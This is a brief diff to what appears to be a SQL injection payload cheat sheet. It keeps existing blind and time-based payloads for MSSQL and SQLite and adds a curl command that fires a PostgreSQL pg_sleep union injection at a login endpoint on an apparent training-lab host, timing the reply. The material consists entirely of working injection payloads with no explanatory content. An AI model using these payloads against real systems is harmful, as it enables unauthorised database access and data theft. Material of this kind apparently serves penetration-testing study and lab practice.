@@ -986,6 +986,9 @@ if (@@VERSION)=9 select 1 else select 2;
 SELECT CASE WHEN (1=1) THEN randomblob(1000000000) ELSE 1 END--
 ~~~
 
+~~~ bash
+curl -X "POST" -d "username=' union select 'a','b' from pg_sleep(10);-- -&password=123456" -w "%{time_total}" -s -o /dev/null http://it.sthubbins.offseclab.io:8080/login
+~~~
 
 ## Filter bypass
 
